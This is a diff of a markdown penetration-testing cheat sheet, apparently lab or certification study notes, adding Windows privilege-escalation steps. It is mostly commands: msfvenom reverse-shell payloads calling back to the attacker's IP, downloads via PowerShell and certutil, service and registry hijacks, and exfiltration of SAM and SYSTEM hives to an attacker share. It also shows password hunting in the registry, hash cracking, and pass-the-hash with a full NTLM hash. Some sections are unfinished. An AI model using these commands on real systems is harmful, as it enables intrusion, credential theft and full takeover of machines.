@@ -7,7 +7,7 @@
 4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
 5. Check for vulnerabiltieis on specific ports using nmap script `nmap -p 80,445,139 --script=*vuln* $IP`
 ## Check vulnerabilities and enumerate for each port
-0. Go to the differnet MD files in the repo.
+0. Go to the differnet MD files in the repository .
 
 ## Creating a reverseshell, uploading a revershell  / creating a stageless payload
 0. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1237 -f exe  -o reverse.exe` 
@@ -15,7 +15,7 @@
 
 ## File Transfer to Window 
 
-### File transfer via own web server
+### File transfer via web server
 0. `python3 -m http.server 8080` from linux
 1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe') -exec bypass` from window
 2. `certutil.exe -urlcache -f  http://myIp:80/winpeas.exe` from window
@@ -24,6 +24,7 @@
 1. `impacket-smbserver smb share/ ` from linux
 2. `net use \\myIP\smb` from window
 3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 
+4. `copy c:\Windows\Repair\SAM \\MYIP\tools\` copy content to my kali
 
  ## Privilege Escalation for Window
  0. Use PowerUp
@@ -50,10 +51,11 @@
 7.  `sc query <SERVICENAME>` check the current status of the service.
 8.  `sc config <SERVICENAME> binpath="\"C:\PrivEsc\reverse.exe\""` set the binary path to the location of the revershell payload. 
 9.  Start a netcat listener and `net start <SERVICENAME>`
+10.  
  ### Unquoted Service Path
  0. `.\winPeas.exe quiet servicesinfo` Look for No quotes and Space detected in winpeas
  1. `Get-UnquotedService` (PowerUp) or `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`\ 
- 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check permission if we can start the service.
+ 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check permission if we can restart the service.
  3. Use accesschk.exe to check for write permissions in each binary path (if BUILTIN/user can write, we should write it in that path)
   ``` 
   > .\accesschk.exe /accepteula -uwdq C:\
@@ -64,22 +66,48 @@
  7. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"` copy file
  8. start a netcat listenr, and `net start <SERVICENAME>`
  
- ### Weak Registery Permissions
+ ### Weak Registery Permissions (Modify service registry)
+1. Same winPeas command as above.
+2. `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<SERVICENAME>` check if its writable i.e (NT AUTHORITY\Interactive)
+3. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check if we can restart the service
+4.  `reg query HKLM\System\CurrentControlSet\Services\<SERVICENAME>` Check the current value and see bin path.
+5.  `reg add HKLM\SYSTEM\CurrentControlSet\services\<SERVICENAME> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` change bin path
+6.  start a netcat listener and `net start <SERVICENAME>`
 
 
-
-
+ ### Insecure service Executable i.e Writable Executable
+ 1. `> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" The c:\Program Files should be changed to my vul path. check we can write on the path
+ 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>`  check we can stop and start service
+ 3. `copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp` create a backup of original service
+ 4. `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"` copy reverse shell to vul path
+ 5.  start a netcat listener  and `net start <SERVICENAME>`
+ 
  ### Writable Service Executable
   0.`Invoke-AllChecks`\
   1.`msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f exe >service.exe`  (payload name has to be same as writable service) 
 
+
+ ### DLL Hijacking 
+ 1.   `.\winPeas.exe quiet servicesinfo` Check write permissions in Path folder(DLL hijacking)
+ 2.  `.\accesschk.exe /accepteula -uvqc user <SERVICENAME>` ***check non microsoft service that has Stop and Start access***
+ 3. ` sc qc <SERVICENAME>` confirm manually that it runs with local system
+ 4. In process
+
+ ### Registry (Exploit the AUTO RUN in registery)
+ 1.  `.\winPEASany.exe quiet applicationsinfo` or manually `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+ 2.  If done manually use accescheck to verfiy every file location. E.G.`\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
+ 3.  `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"` copy revershell
+ 4.  start a netcat listener and login as admin and restart
+
+ 
  ### AlwaysInstallElevate
  check if both values are 1.\
- 0.`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
- 1.`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
- 2. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >payload.msi`  (create a payload) 
- 3. Transfer payload to Temp and execute
- 4. `msiexec /i "C:\Windows\Temp\payload.msi"`
+ 0. `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
+ 1. `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\ 
+ 2. or ` reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+ 3. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >reverse.msi`  (create a payload) 
+ 4. Transfer payload to Temp and execute
+ 5. `msiexec /quiet  /qn /i "C:\Windows\Temp\reverse.msi"`
 
 
  ### SeImpersonatePrivilege 
@@ -93,6 +121,37 @@
  4. open netcat listener 
  5.  `.\x64.exe C:\PrivEsc\reverse.exe`
  
+ 
+ ### Passwords
+ 1. `.\winPEASany.exe quiet filesinfo userinfo` or manually  ` reg query HKLM /f password /t REG_SZ /s` and `reg query HKCU /f password /t REG_SZ /s`
+ 2. `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
+ 3. `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
+ 4. `winexe -U 'admin%password123' //TARGETIP cmd.exe` spawn a shell with kali
+ 5. or `winexe -U 'admin%password123' --system //TARGETIP cmd.exe` for system privilege
+ ### Saved Credentials
+ 1. `.\winPEASany.exe quiet cmd windowscreds`
+ 2. ` cmdkey /list` to confirm manually  if there arent any saved creds  try `C:\PrivEsc\savecred.bat`
+ 3. start netcat linstener
+ 4. `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+ ### Configuration files
+1.  `.\winPEASany.exe quiet cmd searchfast filesinfo`
+2. Run recursive command manually. Do not run it on C:\ root but on `user directory or admin directory`
+3. ` dir /s *pass* == *.config`  and ` findstr /si password *.xml *.ini *.txt`
+4.  `winexe -U 'admin%password123' //TARGETIP cmd.exe`
+
+
+### SAM (Security Account Manager)
+
+1. `.\winPEASany.exe quiet cmd searchfast filesinfo`
+2. `copy C:\Windows\Repair\SAM \\MYIP\MYDIRECTORY\` and `copy C:\Windows\Repair\SYSTEM \\MYIP\MYDIRECTORY\` copy the SAM and KEY(SYSTEM) to local kali
+3. `git clone https://github.com/Neohapsis/creddump7.git` download from kali
+4.  `python2 creddump7/pwdump.py SYSTEM SAM` Run in the location of your copied SAM, SYSTEM file 
+5.   `hashcat -m 1000 --force NTLMHASH(2ndpart) /usr/share/wordlists/rockyou.txt` and then use `winexe`.
+6.   Or without cracking the hash-> pass the hash
+7.   `pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da(ENTIREHASH)' //TARGETIP cmd.exe`
+8.   
+
+
 ## File Transfer to Linux 
 0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
 1.`python3 -m http.server 8080` `or( 80)`
